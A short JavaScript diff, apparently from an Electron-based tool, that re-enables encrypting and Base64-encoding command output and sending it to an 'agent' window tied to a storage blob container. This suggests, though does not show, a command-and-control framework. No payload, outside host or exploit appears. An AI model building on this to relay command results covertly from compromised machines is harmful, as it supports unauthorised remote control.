@@ -355,9 +355,9 @@ try{
   key = Buffer.from(key, 'hex');
   iv  = Buffer.from(iv,  'hex');
   fileop = false;
-  // let command_output = await func_Encrypt(ipcoutput, key,iv);
-  // command_output     = await func_Base64_Encode(command_output);
-  // agentwindow.webContents.send('send-output',agent.container.name, agent.container.blobs['out'],command_output);
+  let command_output = await func_Encrypt(ipcoutput, key,iv);
+  command_output     = await func_Base64_Encode(command_output);
+  agentwindow.webContents.send('send-output',agent.container.name, agent.container.blobs['out'],command_output);
   if (handover === false)
   {
     //execwindow.close();
